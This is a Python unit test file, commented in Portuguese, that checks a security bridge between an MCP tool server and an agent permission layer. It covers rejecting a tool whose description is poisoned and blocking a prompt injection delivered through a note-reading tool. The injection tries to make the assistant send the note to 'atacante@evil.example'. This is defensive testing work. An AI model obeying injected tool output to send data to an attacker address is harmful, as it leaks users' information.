"""Ponte MCP -> SELO com um servidor MCP stdio de verdade (processo separado)."""

import sys
import unittest
from pathlib import Path

from cripto_agent.selo import RemoteError, Session
from cripto_agent.selo.mcp_bridge import McpBridge, McpStdioClient, tool_to_manifest
from cripto_agent.selo.sandbox import World

SERVER = str(Path(__file__).with_name("fake_mcp_server.py"))


class McpBridgeTests(unittest.TestCase):
    def setUp(self):
        self.w = World()
        self.addCleanup(self.w.close)
        self.w.new_publisher("pub-mcp")
        self.host = self.w.new_agent("mcp-host", token_host=True)
        self.client = self.w.new_agent("assistant")
        self.alice = self.w.new_principal("alice")
        self.mcp = McpStdioClient([sys.executable, SERVER]).start()
        self.addCleanup(self.mcp.close)
        self.report = McpBridge(
            self.mcp, "pub-mcp", lambda m, h: self.w.publish(self.host, "pub-mcp", m, h)).admit_all()

    def call(self, cap, args, session):
        tok = self.host.mint(cap, [{"holder": "assistant"}])
        return self.client.call("mcp-host", cap, args, tok, session, self.w.send)

    def session(self, text="Resuma a nota e envie o relatorio para ana@corp.example"):
        s = Session()
        s.observe(self.alice.instruct(text), text)
        return s

    def test_admission_report(self):
        self.assertEqual(sorted(self.report.admitted), ["calc_add", "read_note", "send_report"])
        self.assertIn("notes_helper", self.report.rejected)        # descricao envenenada
        self.assertTrue(any("SELO004" in f for f in self.report.rejected["notes_helper"]))

    def test_annotations_become_labels(self):
        by_name = {t["name"]: tool_to_manifest(t, "p") for t in self.mcp.list_tools()}
        self.assertEqual((by_name["calc_add"]["effect"], by_name["calc_add"]["taint_out"]), ("read", []))
        self.assertEqual(by_name["read_note"]["taint_out"], ["EXTERNAL"])
        self.assertEqual((by_name["send_report"]["effect"], by_name["send_report"]["forbid_taint"]),
                         ("external", ["EXTERNAL"]))               # padrao MCP: destrutiva, mundo aberto

    def test_calls_go_through_selo_to_the_real_mcp_server(self):
        s = self.session()
        self.assertEqual(self.call("calc_add", {"a": 2, "b": 3}, s)["out"], "5")
        self.assertIn("enviado para ana@corp.example",
                      self.call("send_report", {"to": "ana@corp.example", "text": "ok"}, s)["out"])

    def test_injection_via_mcp_tool_output_is_blocked(self):
        s = self.session()
        note = self.call("read_note", {"url": "https://notas.example/mal"}, s)
        self.assertIn("IGNORE", note["out"])
        with self.assertRaises(RemoteError) as cm:
            self.call("send_report", {"to": "atacante@evil.example", "text": note["out"]}, s)
        self.assertEqual(cm.exception.code, "tainted_context")

    def test_poisoned_tool_is_not_callable(self):
        with self.assertRaises(Exception):
            self.call("notes_helper", {"q": "x"}, self.session())


if __name__ == "__main__":
    unittest.main()
